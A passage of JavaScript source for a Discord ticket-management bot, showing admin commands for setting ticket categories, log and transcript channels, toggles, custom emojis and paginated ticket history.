                                    settings.updateOne({ ReactionEmoji: emoji }).then(result => {
                                        message.channel.send(new Discord.MessageEmbed().setDescription(`✅ Set \`${emoji}\` as Creation Emoji`).setColor('GREEN'));
                                    });

                                })
                                .catch(err => {
                                    return message.channel.send('**:x: I Can\' React This Emoji\n**Please Make Sure That Emoji in This Server');
                                });
                        }
                    }
                }).catch(err => { return message.channel.send(embed) })
            }
            if (message.content.startsWith(prefix + "setcategory") || message.content.startsWith(prefix + "setcat") || aliase.command == 'category') {
                if (!message.member.hasPermission("MANAGE_GUILD")) return; let l = message.content.split(" ").length - 1;
                let channel = message.guild.channels.cache.find(ch => ch.id == message.content.split(" ")[l]);
                if (!channel)
                    return message.channel.send("**Please Check the Category ID** !");
                if (channel.type !== "category")
                    return message.channel.send("**Please Check the Category ID** !");
                message.channel.send(
                    new Discord.MessageEmbed()
                        .setAuthor(message.author.username, message.author.avatarURL)
                        .setColor(64189)
                        .setTitle("Your Changes Has been saved ✅")
                        .setDescription(`**\n** **Set The Category to: ${channel}**\n`)
                        .setFooter(message.guild.name, `https://cdn.discordapp.com/icons/${message.guild.id}//${message.guild.icon}.png?size=1024`)
                        .setTimestamp()
                );
                settings.updateOne({ category: channel.id }).then(result => { })
                return;
            }
            if (message.content.startsWith(prefix + "setlog") || aliase.command == 'setlog') {
                if (!message.member.hasPermission("MANAGE_GUILD")) return; let l = message.content.split(" ").length - 1;
                let channel = message.guild.channels.cache.find(r => r.id == message.content.split(" ")[l] || r.name == message.content.split(" ").slice(l).join(" ")) || message.mentions.channels.first();
                if (!channel) return message.channel.send("**Please Check the Channel Name/ID** !");
                if (channel.type == 'news') return message.channel.send(`**LOGGING channel can't be a news channel**!`)
                if (channel.type !== "text")
                    return message.channel.send("**Please Check the Channel Name/ID** !");
                settings.updateOne({ log: channel.id }).then(result => { })
                message.channel.send(
                    new Discord.MessageEmbed()
                        .setAuthor(message.author.username, message.author.avatarURL)
                        .setColor(64189)
                        .setTitle("Your Changes Has been saved ✅")
                        .setDescription(`**\n** **Set The Log Channel to: ${channel}**\n`)
                        .setFooter(message.guild.name, `https://cdn.discordapp.com/icons/${message.guild.id}//${message.guild.icon}.png?size=1024`)
                        .setTimestamp()
                );
            }
            if (message.content == prefix + 'tickets toggle' || aliase.command == 'tickets toggle') {
                if (!message.member.hasPermission("MANAGE_GUILD")) return;
                let embed = new Discord.MessageEmbed().setColor('#d2f4ff').addField(`Type:`, `1: To disable **new** Command
2: To disable **ReactionTickets**
3: To disable **Both**
4: To enable **Both**`)
                message.channel.send(embed).then(msg => {
                    let filter = m => m.author.id == message.author.id
                    message.channel.awaitMessages(filter, { max: 1, time: 20 * 1000, errors: ['time'] })
                        .then(response => {
                            response.first().delete().catch(err => null); msg.delete().catch(err => null);
                            if (response.first().content === '1') {
                                settings.updateOne({ disable: '1' }).then(result => { })
                                let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `Disabled **New** Command`).setColor('#d2f4ff')
                                message.channel.send(embedd)

                            }
                            if (response.first().content === '2') {
                                settings.updateOne({ disable: '2' }).then(result => { })
                                let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `Disabled **ReactionTickets**`).setColor('#d2f4ff')
                                message.channel.send(embedd)

                            }
                            if (response.first().content === '3') {
                                settings.updateOne({ disable: '3' }).then(result => { })
                                let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `Disabled **Both**`).setColor('#d2f4ff')
                                message.channel.send(embedd)

                            }
                            if (response.first().content === '4') {
                                settings.updateOne({ disable: null }).then(result => { })
                                let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `Enabled **Both**`).setColor('#d2f4ff')
                                message.channel.send(embedd)
                            }

                        }).catch(mys => { msg.delete().catch(err => null); })
                })
            }
            if (message.content == prefix + 'tickets close toggle' || aliase.command == 'tickets close toggle') {
                if (!message.member.hasPermission("MANAGE_GUILD")) return;
                let embed = new Discord.MessageEmbed().setColor('#d2f4ff').addField(`who can close the Ticket`, `1: Only **Support** Role and administrator
2: **Everyone** in the Ticket`)
                message.channel.send(embed).then(msg => {
                    let filter = m => m.author.id == message.author.id
                    message.channel.awaitMessages(filter, { max: 1, time: 20 * 1000, errors: ['time'] })
                        .then(response => {
                            response.first().delete().catch(err => null); msg.delete().catch(err => null);
                            if (response.first().content === '1') {
                                settings.updateOne({ close: '1' }).then(result => { })
                                let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `Only **Support** Role and administrator Can close the Ticket`).setColor('#d2f4ff')
                                message.channel.send(embedd)

                            }
                            if (response.first().content === '2') {
                                settings.updateOne({ disable: '2' }).then(result => { })
                                let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `**Everyone** Can close the Ticket`).setColor('#d2f4ff')
                                message.channel.send(embedd)

                            }
                        }).catch(mys => { msg.delete().catch(err => null); })
                })
            }
            if (message.content == prefix + 'tickets rename toggle' || aliase.command == 'tickets rename toggle') {
                if (!message.member.hasPermission("MANAGE_GUILD")) return;
                let embed = new Discord.MessageEmbed().setColor('#d2f4ff').addField(`who can Rename the Ticket`, `1: Only **Support** Role and administrator
2: **Everyone** in the Ticket`)
                message.channel.send(embed).then(msg => {
                    let filter = m => m.author.id == message.author.id
                    message.channel.awaitMessages(filter, { max: 1, time: 20 * 1000, errors: ['time'] })
                        .then(response => {
                            response.first().delete().catch(err => null); msg.delete().catch(err => null);
                            if (response.first().content === '1') {
                                settings.updateOne({ rename: '1' }).then(result => { })
                                let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `Only **Support** Role and administrator Can Rename the Ticket`).setColor('#d2f4ff')
                                message.channel.send(embedd)

                            }
                            if (response.first().content === '2') {
                                settings.updateOne({ rename: '2' }).then(result => { })
                                let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `**Everyone** Can Rename the Ticket`).setColor('#d2f4ff')
                                message.channel.send(embedd)

                            }

                        }).catch(mys => { msg.delete().catch(err => null); })
                })
            }

            if (message.content == prefix + 'prv' || aliase.command == 'prv') {
                if (!message.member.hasPermission("MANAGE_GUILD")) return;
                let embed = new Discord.MessageEmbed().setColor('#d2f4ff').addField(`Private message options`, `1: **Notice** the ticket has been Deleted
2: **Notice** the ticket has been Deleted and send Messages **Trasncript**\n3: Disable **Both**`)
                message.channel.send(embed).then(msg => {
                    let filter = m => m.author.id == message.author.id
                    message.channel.awaitMessages(filter, { max: 1, time: 20 * 1000, errors: ['time'] })
                        .then(response => {
                            response.first().delete().catch(err => null); msg.delete().catch(err => null);
                            if (response.first().content === '1') {
                                settings.updateOne({ prv: '1' }).then(result => { })
                                let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `i will **Notice** the member when the ticket has been Deleted`).setColor('#d2f4ff')
                                message.channel.send(embedd)

                            }
                            if (response.first().content === '2') {
                                settings.updateOne({ prv: '2' }).then(result => { })
                                let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `i will **Notice** the member when the ticket has been Deleted and send him the **Transcript**`).setColor('#d2f4ff')
                                message.channel.send(embedd)

                            }
                            if (response.first().content === '3') {
                                settings.updateOne({ prv: '3' }).then(result => { })
                                let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `I will not send a Private mesage to the member`).setColor('#d2f4ff')
                                message.channel.send(embedd)

                            }
                        }).catch(mys => { msg.delete().catch(err => null); })
                })
            }


            if (message.content == prefix + "count reset" || aliase.command == 'count reset') {
                if (!message.member.hasPermission("MANAGE_GUILD")) return;
                settings.updateOne({ count: '0' }).then(result => { })
                return message.channel.send("**The Tickets Count Has been reset ✅**");
            }
            //   if (message.content.startsWith(prefix + "tickets cooldown")) {
            //     if(!message.member.hasPermission('MANAGE_GUILD')) return message.channel.send(`You Don't Have **MANAGE_GUILD** Premission!`).then(m => m.delete(3*100))
            //     let numm = message.content.split(" ").slice(2).join(" ");
            //       if (!numm) return message.channel.send(`Please Type a Time or "off" to disable`);
            //       if(numm == 'off') {
            //        delete tickets[message.guild.id].time
            //         fs.writeFile("./tickets.json", JSON.stringify(tickets), err => {if (err) console.error(err);});
            //         return message.channel.send(`**The Cooldown has been disabled!**`)
            //       }
            //       if(!numm.match(/[1-60][m,h]/g))return message.channel.send(`**:x: Invalid value**!\nUse: \`[1-60][m,h]\``);
            //       const ms = require('ms');
            //       tickets[message.guild.id].time = ms(numm);
            //       fs.writeFile("./tickets.json", JSON.stringify(tickets), err => {if (err) console.error(err);});
            //         message.channel.send(`**The wait time set to \`${ms(ms(numm),{long:true})}\`** ✅`)
            // }
            if (message.content.startsWith(prefix + "limit") || aliase.command == 'limit') {
                if (!message.member.hasPermission('MANAGE_GUILD')) return message.channel.send(`You Don't Have **MANAGE_GUILD** Premission!`).then(m => m.delete(3 * 100));
                if (args[2] == 'off' || args[2] == '0') {
                    message.channel.send(`**The max length of tickets set to \`Unlimited\` ✅**`);
                    settings.updateOne({ limit: '0' }).then(result => { }); return
                }
                if (isNaN(args[2])) return message.channel.send(`Please type a right number or "off" to disable`);
                if (args[2] > 10 || args[2] < 1) return message.channel.send(`**Please select a number betweem \`1-10\` 🔢**`);
                message.channel.send(`**The max length of tickets set to \`${args[2]}\` ✅**`);
                settings.updateOne({ limit: `${args[2]}` }).then(result => { })
            }
            if (message.content.startsWith(prefix + "settrans") || message.content.startsWith(prefix + "transcript") || aliase.command == 'settrans') {
                if (!message.member.hasPermission("MANAGE_GUILD")) return;
                if (message.content.split(" ").slice(2).join(" ") == 'off') {
                    message.channel.send(
                        new Discord.MessageEmbed()
                            .setAuthor(message.author.username, message.author.avatarURL)
                            .setColor(64189)
                            .setTitle("Your Changes Has been saved ✅")
                            .setDescription(`**Disabled the Transcript message**`)
                            .setFooter(message.guild.name, `https://cdn.discordapp.com/icons/${message.guild.id}//${message.guild.icon}.png?size=1024`)
                            .setTimestamp()
                    ); settings.updateOne({ transcript: null }).then(result => { })
                    return

                } let l = message.content.split(" ").length - 1;
                let channel = message.guild.channels.cache.find(r => r.id == message.content.split(" ")[l] || r.name == message.content.split(" ").slice(l).join(" ")) || message.mentions.channels.first();
                if (!channel) return message.channel.send("**Please Check the Channel Name/ID** (or `off` to disable the Transcript message)!");
                if (channel.type == 'news') return message.channel.send(`**TICKETS transcript channel can't be a news channel**!`)
                if (channel.type !== "text")
                    return message.channel.send("**Please Check the Channel Name/ID** !");
                settings.updateOne({ transcript: channel.id }).then(result => { })
                message.channel.send(
                    new Discord.MessageEmbed()
                        .setAuthor(message.author.username, message.author.avatarURL)
                        .setColor(64189)
                        .setTitle("Your Changes Has been saved ✅")
                        .setDescription(`**\n** **Set The transcript Channel to: ${channel}**`)
                        .setFooter(message.guild.name, `https://cdn.discordapp.com/icons/${message.guild.id}//${message.guild.icon}.png?size=1024`)
                        .setTimestamp()
                );
            }
            if (message.content == prefix + "autosave" || message.content == prefix + "tickets autosave") {
                if (!message.member.hasPermission('MANAGE_GUILD')) return;
                let embed = new Discord.MessageEmbed().setColor('#d2f4ff').addField(`AutoSaving options`, `1: After **Closing** The Ticket
2: While **Deleting** The Ticket\n3: **Disable** AutoSaving`)
                message.channel.send(embed).then(msg => {
                    let filter = m => m.author.id == message.author.id
                    message.channel.awaitMessages(filter, { max: 1, time: 20 * 1000, errors: ['time'] })
                        .then(response => {
                            response.first().delete().catch(err => null); msg.delete().catch(err => null);
                            if (response.first().content === '1') {
                                settings.updateOne({ auto: '1' }).then(result => { })
                                let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `I Will Save The Ticket **Transcript** After **Closing** it`).setColor('#d2f4ff')
                                message.channel.send(embedd)

                            }
                            if (response.first().content === '2') {
                                settings.updateOne({ auto: '2' }).then(result => { })
                                let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `I Will Save The Ticket **Transcript** While it **Deleting**`).setColor('#d2f4ff')
                                message.channel.send(embedd)

                            }
                            if (response.first().content === '3') {
                                settings.updateOne({ auto: '3' }).then(result => { })
                                let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `I will not Auto-Save Any Ticket`).setColor('#d2f4ff')
                                message.channel.send(embedd)

                            }
                        }).catch(mys => { msg.delete().catch(err => null); })
                })
            }
            if (message.content == prefix + 'save' || message.content == prefix + 'transcript save' || aliase.command == 'save') {
                if (!message.member.hasPermission('MANAGE_CHANNELS')) {
                    if (!message.member.roles.cache.find(g => g.id === settings.suprole)) return
                }
                if (!TRanss) return message.channel.send(new Discord.MessageEmbed()
                    .setDescription(`:x: **Can't get the ticket info about this channel!**\nPlease make sure this is a ticket channel`)
                    .setColor('RED'));
                if (TRanss.t == 'true') return
                let u = await client.users.fetch(message.channel.topic).catch(err => { return }); if (!u
                ) return message.channel.send(new Discord.MessageEmbed().setDescription(`:x: **Can't get the ticket Owner!**`).setColor('RED'));
                message.channel.startTyping();
                TRanss.updateOne({
                    t: 'true'
                }).then(result => { })
                Save(message.channel, u, message.author.id, settings, 'command');
            }
            if (message.content == prefix + 'claim settings') {
                if (!message.member.hasPermission('MANAGE_GUILD')) return;
                let embed = new Discord.MessageEmbed().setColor('#d2f4ff').setTitle('Claim Options')
                    .addField('Overwrite Permission For \`Support Role\` After someone claimed the tickets:', `1: Disable **\`VIEW_CHANNEL\`**
2: Disable **\`SEND_MESSAGES\`**`).addField(`Others Options:`, `3: Disable Claiming Feature`)
                message.channel.send(embed)
                    .then(msg => {
                        let filter = m => m.author.id == message.author.id
                        message.channel.awaitMessages(filter, { max: 1, time: 20 * 1000, errors: ['time'] })
                            .then(response => {
                                response.first().delete().catch(err => null); msg.delete().catch(err => null);
                                if (response.first().content === '1') {
                                    settings.updateOne({ claim: '1' }).then(result => { })
                                    let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `Disable **\`VIEW_CHANNEL\`** For **\`Support Role\`** after Claiming The Ticket`).setColor('#d2f4ff')
                                    message.channel.send(embedd)
                                }
                                if (response.first().content === '2') {
                                    settings.updateOne({ claim: '2' }).then(result => { })
                                    let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `Disable **\`SEND_MESSAGES\`** For **\`Support Role\`** after Claiming The Ticket`).setColor('#d2f4ff')
                                    message.channel.send(embedd)
                                }
                                if (response.first().content === '3') {
                                    settings.updateOne({ claim: '3' }).then(result => { })
                                    let embedd = new Discord.MessageEmbed().addField('**✅ Changes Successfully Saved**', `Disable **Claiming** Feature`).setColor('#d2f4ff')
                                    message.channel.send(embedd)
                                }
                            }).catch(mys => { msg.edit(new Discord.MessageEmbed().setDescription('**Timed Out to Chose**').setColor('#d2f4ff')).catch(err => null); })
                    })
            }

            if (message.content.startsWith(prefix + 'history reset')) {
                if (!message.member.hasPermission('MANAGE_GUILD')) return;
                if (message.content.split(" ")[2] == "all") {

                    let Com = 'are you sure you want to delete all this all tickets history? type (y) to comfirm'
                    if (settings.lang == 'ar') Com = 'هل انت متأكد من مسح كل التذاكر المحفوظه؟ قم بكتابه (y) لتأكيد المسح'
                    message.channel.send(`**${Com}**`)
                        .then(async msg1 => {
                            var response = await message.channel.awaitMessages(msg2 => msg2.author.id === message.author.id, {
                                max: 1, time: 40000, errors: ['time']
                            });
                            response.first().delete().catch(err => null);
                            if (response.first().content == 'y') {
                                let XC = 0; msg1.delete().catch(err => null);
                                message.channel.send(new Discord.MessageEmbed().setColor(`YELLOW`)
                                    .setDescription(`**⏱️ Start Removing Tickets history from My Database...**`)).then(MN => {
                                        let XC = settings.tickets.length;
                                        settings.updateOne({ tickets: [] }).then(result => { });
                                        setTimeout(() => {
                                            settings.updateOne({ tickets: [] }).then(result => { });
                                            MN.edit(new Discord.MessageEmbed().setColor(`GREEN`)
                                                .setDescription(`**✅ Removed ${XC} Ticket History**`))
                                        }, 3000);
                                    })
                            } else msg1.edit(`**:x: Cancel**`)
                        })
                    return;
                }
                let member = message.mentions.members.first() || await message.guild.members.fetch(`${message.content.split(" ")[1]}`).catch(err => null)
                if (!member) {
                    if (settings.lang == 'ar') return message.channel.send(`**لا يمكنني العثور على هذا العضو :x:**`);
                    return message.channel.send(`**Please mention the user :x:**\nOr Type \`all\` To reset all saved Transcripts`);
                }
                let Com = 'are you sure you want to delete all this member tickets history? type (y) to comfirm'
                if (settings.lang == 'ar') Com = 'هل انت متأكد من مسح كل التذاكر المحفوظه لهذا العضو؟ قم بكتابه (y) لتأكيد المسح'
                message.channel.send(`**${Com}**`)
                    .then(async msg1 => {
                        var response = await message.channel.awaitMessages(msg2 => msg2.author.id === message.author.id, {
                            max: 1, time: 40000, errors: ['time']
                        });
                        response.first().delete().catch(err => null);
                        if (response.first().content == 'y') {
                            let XC = 0; msg1.delete().catch(err => null);
                            message.channel.send(new Discord.MessageEmbed().setColor(`YELLOW`)
                                .setDescription(`**⏱️ Start Removing ${member} Tickets history from My Database...**`)).then(MN => {
                                    let z = [];
                                    settings.tickets.forEach(async C => {
                                        if (C.member == member.id) { XC++; return; } else z.push(C);
                                    }); setTimeout(() => {
                                        settings.updateOne({ tickets: z }).then(result => { });
                                        MN.edit(new Discord.MessageEmbed().setColor(`GREEN`)
                                            .setDescription(`**✅ Removed ${XC} Ticket History**`))
                                    }, 3000);
                                })
                        } else msg1.edit(`**:x: Cancel**`)
                    })

            }

            if (message.content.startsWith(prefix + 'history')) {
                if (!message.member.hasPermission('MANAGE_GUILD')) return;
                if (args[1] == 'reset') return
                let member = message.mentions.members.first() || await message.guild.members.fetch(`${message.content.split(" ")[1]}`).catch(err => null)
                if (member) {
                    let HS = []; let HS1 = []; let HS2 = []; let HS3 = []; let HS4 = []; let HS5 = []; let HS6 = []; let XC = 0;
                    settings.tickets.forEach(async C => {
                        if (C.member !== member.id) return; XC++;
                        if (XC <= 10) HS1.push(`**${XC}- \`(${moment(C.date).format('MMM Do YY, h:mm a')})\`: [Transcript](https://tickettool.xyz/direct?url=${C.url})**`)
                        if (XC > 10 && XC < 20) {
                            HS2.push(`**${XC}- \`(${moment(C.date).format('MMM Do YY, h:mm a')})\`: [Transcript](https://tickettool.xyz/direct?url=${C.url})**`)
                        } if (XC >= 20 && XC < 30) {
                            HS3.push(`**${XC}- \`(${moment(C.date).format('MMM Do YY, h:mm a')})\`: [Transcript](https://tickettool.xyz/direct?url=${C.url})**`)
                        } if (XC >= 30 && XC <= 40) {
                            HS4.push(`**${XC}- \`(${moment(C.date).format('MMM Do YY, h:mm a')})\`: [Transcript](https://tickettool.xyz/direct?url=${C.url})**`)
                        }
                        if (XC > 40 && XC < 50) {
                            HS5.push(`**${XC}- \`(${moment(C.date).format('MMM Do YY, h:mm a')})\`: [Transcript](https://tickettool.xyz/direct?url=${C.url})**`)
                        } if (XC >= 50 && XC <= 60) {
                            HS6.push(`**${XC}- \`(${moment(C.date).format('MMM Do YY, h:mm a')})\`: [Transcript](https://tickettool.xyz/direct?url=${C.url})**`)
                        }
                        if (XC > 60) return
                    }); message.channel.startTyping();
                    setTimeout(() => {
                        message.channel.stopTyping();
                        HS.push(HS1.join('\n'));
                        if (XC > 10) HS.push(HS2.join('\n'));
                        if (XC > 20) HS.push(HS3.join('\n'));
                        if (XC > 30) HS.push(HS4.join('\n'));
                        if (XC > 40) HS.push(HS5.join('\n'));
                        if (XC > 50) HS.push(HS6.join('\n'));
                        let page = 1;
                        if (HS1.join('\n').length > 1999) return message.channel.send(`The History Is Too Big to be shown!`)
                        let embed = new Discord.MessageEmbed().setDescription(`${HS[page - 1]}`)
                            .setColor(55290).setAuthor(`${member.user.username} tickets history: (${XC})`, `https://cdn.discordapp.com/avatars/${member.user.id}/${member.user.avatar}?size=1024`)
                            .setFooter(`Page ${page} of ${HS.length}`, `https://cdn.discordapp.com/icons/${message.guild.id}//${message.guild.icon}.png?size=1024`)
                        if (XC > 60) embed.setTitle('Only 60 Of Them')
                        message.channel.send(embed)
                            .then(msg => {
                                msg.react('◀️').then(r => {
                                    msg.react('▶️')
                                    const backwardsFilter = (reaction, user) => reaction.emoji.name === '◀️' && user.id === message.author.id;
                                    const forwardsFilter = (reaction, user) => reaction.emoji.name === '▶️' && user.id === message.author.id;
                                    const backwards = msg.createReactionCollector(backwardsFilter, { time: 120000 });
                                    const forwards = msg.createReactionCollector(forwardsFilter, { time: 120000 });
                                    backwards.on('collect', r => {
                                        if (page === 1) return; page--; embed.setDescription(HS[page - 1]); embed.setFooter(`Page ${page} of ${HS.length}`); msg.edit(embed)
                                    })
                                    forwards.on('collect', r => {
                                        if (page === HS.length) return; page++; embed.setDescription(HS[page - 1]); embed.setFooter(`Page ${page} of ${HS.length}`); msg.edit(embed)
                                    })
                                })
                            }).catch(err => null);
                    }, 2000); return
                }
                if (args[1] && ms(args[1])) {
                    let HS = []; let HS1 = []; let HS2 = []; let HS3 = []; let HS4 = []; let HS5 = []; let HS6 = []; let XC = 0;
                    settings.tickets.forEach(async C => {
                        if (Date.now() - C.date > ms(args[1])) return; XC++;
                        if (XC <= 8) HS1.push(`**${XC}- <@${C.member}>\n\`(${moment(C.date).format('MMM Do YY, h:mm a')})\`: [Transcript](https://tickettool.xyz/direct?url=${C.url})**`)
                        if (XC > 8 && XC < 16) {
                            HS2.push(`**${XC}- <@${C.member}>\n\`(${moment(C.date).format('MMM Do YY, h:mm a')})\`: [Transcript](https://tickettool.xyz/direct?url=${C.url})**`)
                        } if (XC >= 16 && XC < 24) {
                            HS3.push(`**${XC}- <@${C.member}>\n\`(${moment(C.date).format('MMM Do YY, h:mm a')})\`: [Transcript](https://tickettool.xyz/direct?url=${C.url})**`)
                        } if (XC >= 24 && XC <= 32) {
                            HS4.push(`**${XC}- <@${C.member}>\n\`(${moment(C.date).format('MMM Do YY, h:mm a')})\`: [Transcript](https://tickettool.xyz/direct?url=${C.url})**`)
                        }
                        if (XC > 32 && XC < 40) {
                            HS5.push(`**${XC}- <@${C.member}>\n\`(${moment(C.date).format('MMM Do YY, h:mm a')})\`: [Transcript](https://tickettool.xyz/direct?url=${C.url})**`)
                        } if (XC >= 40 && XC <= 48) {
                            HS6.push(`**${XC}- <@${C.member}>\n\`(${moment(C.date).format('MMM Do YY, h:mm a')})\`: [Transcript](https://tickettool.xyz/direct?url=${C.url})**`)
                        }
                        if (XC > 48) return
                    }); message.channel.startTyping();
                    setTimeout(() => {
                        message.channel.stopTyping();
                        HS.push(HS1.join('\n'));
                        if (XC > 10) HS.push(HS2.join('\n'));
                        if (XC > 20) HS.push(HS3.join('\n'));
                        if (XC > 30) HS.push(HS4.join('\n'));
                        if (XC > 40) HS.push(HS5.join('\n'));
                        if (XC > 50) HS.push(HS6.join('\n'));
                        let page = 1;
                        if (HS1.join('\n').length > 1999) return message.channel.send(`The History Is Too Big to be shown!`)
                        let embed = new Discord.MessageEmbed().setDescription(`${HS[page - 1]}`).setTitle(`${XC} Transcript`)
                            .setColor(55290).setAuthor(`${message.guild.name} Deleted Tickets in the last ${countdown(Date.now() - ms(args[1]))}`, `https://cdn.discordapp.com/icons/${message.guild.id}/${message.guild.icon}.png?size=1024`)
                            .setFooter(`Page ${page} of ${HS.length}`, `https://cdn.discordapp.com/icons/0000000000//00000000.png?size=1024`)
                        if (XC > 48) embed.setTitle(`${XC} Transcript | Only 48 Of Them`)
                        message.channel.send(embed)
                            .then(msg => {
                                msg.react('◀️').then(r => {
                                    msg.react('▶️')
                                    const backwardsFilter = (reaction, user) => reaction.emoji.name === '◀️' && user.id === message.author.id;
                                    const forwardsFilter = (reaction, user) => reaction.emoji.name === '▶️' && user.id === message.author.id;
                                    const backwards = msg.createReactionCollector(backwardsFilter, { time: 120000 });
                                    const forwards = msg.createReactionCollector(forwardsFilter, { time: 120000 });
                                    backwards.on('collect', r => {
                                        if (page === 1) return; page--; embed.setDescription(HS[page - 1]); embed.setFooter(`Page ${page} of ${HS.length}`); msg.edit(embed)
                                    })
                                    forwards.on('collect', r => {
                                        if (page === HS.length) return; page++; embed.setDescription(HS[page - 1]); embed.setFooter(`Page ${page} of ${HS.length}`); msg.edit(embed)
                                    })
                                })
                            }).catch(err => null);
                    }, 2000); return;
                }
                return message.channel.send(new Discord.MessageEmbed().setTitle('Usage:')
                    .setDescription(`\`${prefix}history ${message.author.id}\`\nShow this member tickets history\n
\`${prefix}history 4h (1-60)(m,h,d,y)\`\nShow Tickets History in the last 4 hours\n
\`${prefix}history reset {MemberID / all}\`\nreset the history`));
            }

            if (message.content == prefix + 'emoji') {
                if (!message.member.hasPermission('MANAGE_GUILD')) return; message.channel.send(`**Please Use \`${prefix}emoji (close,delete,reopen,save,claim,reset)\`**`)
            }

            if (message.content == prefix + 'emoji reset') {
                if (!message.member.hasPermission('MANAGE_GUILD')) return;
                let Com = 'are you sure you want to delete all the custom emojies? type (y) to comfirm\n`Please Note that: all the old emoji will not work after this action!`'
                if (settings.lang == 'ar') Com = 'هل انت متأكد من مسح كل الايموجيهات؟ قم بكتابه (y) لتأكيد المسح\n`الرجاء العلم بانه كل الايموجيهات القديمة لن تعمل بعد هذا الاجراء`'
                message.channel.send(`**${Com}**`)
                    .then(async msg1 => {
                        var response = await message.channel.awaitMessages(msg2 => msg2.author.id === message.author.id, {
                            max: 1, time: 40000, errors: ['time']
                        });
                        response.first().delete().catch(err => null);
                        if (response.first().content == 'y') {
                            msg1.delete();
                            settings.updateOne({ emClose: '🔒', emClaim: '📌', emReopen: '🔓', emDelete: '🚫', emSave: '📧' }).then(result => { });
                            return message.channel.send(`**✅ All Custom Emojies Has been Reset**`)
                        } else msg1.edit(`**:x: Cancel**`)
                    })
            }

            if (message.content.startsWith(prefix + 'emoji close')) {
                if (!message.member.hasPermission('MANAGE_GUILD')) return;
                if (!args[2]) return message.channel.send('**Please Type the emoji after the Command :x:**');
                let emoji;
                if (args[2].startsWith('<:') || args[2].startsWith('<a:')) {
                    let em = args[2].split("<:")[1] || args[2].split("<a:")[1]; console.log(em)
                    emoji = em.split('>')[0]
                } else { emoji = args[2] }
                await message.react(emoji)
                    .then(M => {
                        message.channel.send(new Discord.MessageEmbed().setDescription(`✅ Set \`${emoji}\` as Closing Emoji`).setColor('GREEN'))
                        settings.updateOne({ emClose: args[2] }).then(result => { });
                    })
                    .catch(err => {
                        return message.channel.send('**:x: I Can\' React This Emoji\n**Please Make Sure That Emoji in This Server');
                    });

            }
            if (message.content.startsWith(prefix + 'emoji reopen')) {
                if (!message.member.hasPermission('MANAGE_GUILD')) return;
                if (!args[2]) return message.channel.send('**Please Type the emoji after the Command :x:**');
                let emoji;
                if (args[2].startsWith('<:') || args[2].startsWith('<a:')) {
                    let em = args[2].split("<:")[1] || args[2].split("<a:")[1]; console.log(em)
                    emoji = em.split('>')[0]
                } else { emoji = args[2] }
                await message.react(emoji)
                    .then(M => {
                        message.channel.send(new Discord.MessageEmbed().setDescription(`✅ Set \`${emoji}\` as Reopen Emoji`).setColor('GREEN'))
                        settings.updateOne({ emReopen: args[2] }).then(result => { });
                    })
                    .catch(err => {
                        return message.channel.send('**:x: I Can\' React This Emoji\n**Please Make Sure That Emoji in This Server');
                    });

            } if (message.content.startsWith(prefix + 'emoji save')) {
                if (!message.member.hasPermission('MANAGE_GUILD')) return;
                if (!args[2]) return message.channel.send('**Please Type the emoji after the Command :x:**');
                let emoji;
                if (args[2].startsWith('<:') || args[2].startsWith('<a:')) {
                    let em = args[2].split("<:")[1] || args[2].split("<a:")[1]; console.log(em)
                    emoji = em.split('>')[0]
                } else { emoji = args[2] }
                await message.react(emoji)
                    .then(M => {
                        message.channel.send(new Discord.MessageEmbed().setDescription(`✅ Set \`${emoji}\` as Saving Emoji`).setColor('GREEN'))
                        settings.updateOne({ emSave: args[2] }).then(result => { });
                    })
                    .catch(err => {
                        return message.channel.send('**:x: I Can\' React This Emoji\n**Please Make Sure That Emoji in This Server');
                    });

            }
            if (message.content.startsWith(prefix + 'emoji delete')) {
                if (!message.member.hasPermission('MANAGE_GUILD')) return;
                if (!args[2]) return message.channel.send('**Please Type the emoji after the Command :x:**');
                let emoji;
                if (args[2].startsWith('<:') || args[2].startsWith('<a:')) {
                    let em = args[2].split("<:")[1] || args[2].split("<a:")[1]; console.log(em)
                    emoji = em.split('>')[0]
                } else { emoji = args[2] }
                await message.react(emoji)
                    .then(M => {
                        message.channel.send(new Discord.MessageEmbed().setDescription(`✅ Set \`${emoji}\` as Deleting Emoji`).setColor('GREEN'))
                        settings.updateOne({ emDelete: args[2] }).then(result => { });
                    })
                    .catch(err => {
                        return message.channel.send('**:x: I Can\' React This Emoji\n**Please Make Sure That Emoji in This Server');
                    });

            }
            if (message.content.startsWith(prefix + 'emoji claim')) {
                if (!message.member.hasPermission('MANAGE_GUILD')) return;
                if (!args[2]) return message.channel.send('**Please Type the emoji after the Command :x:**');
                let emoji;
                if (args[2].startsWith('<:') || args[2].startsWith('<a:')) {
                    let em = args[2].split("<:")[1] || args[2].split("<a:")[1]; console.log(em)
                    emoji = em.split('>')[0]
                } else { emoji = args[2] }
                await message.react(emoji)
                    .then(M => {
                        message.channel.send(new Discord.MessageEmbed().setDescription(`✅ Set \`${emoji}\` as Claiming Emoji`).setColor('GREEN'))
                        settings.updateOne({ emClaim: args[2] }).then(result => { });
                    })
                    .catch(err => {
                        return message.channel.send('**:x: I Can\' React This Emoji\n**Please Make Sure That Emoji in This Server');
                    });
            }
            if (message.content == prefix + 'tickets settings'
                || message.content == prefix + 'settings tickets'
                || message.content == prefix + 'tickets config'
                || message.content == prefix + 'config'
                || aliase.command == 'tickets config') {
                if (!message.member.hasPermission('MANAGE_GUILD')) return;
                let role = await message.guild.roles.fetch(settings.suprole);
                let log = await message.guild.channels.cache.find(r => r.id == settings.log);
                let cat = await message.guild.channels.cache.find(r => r.id == settings.category);
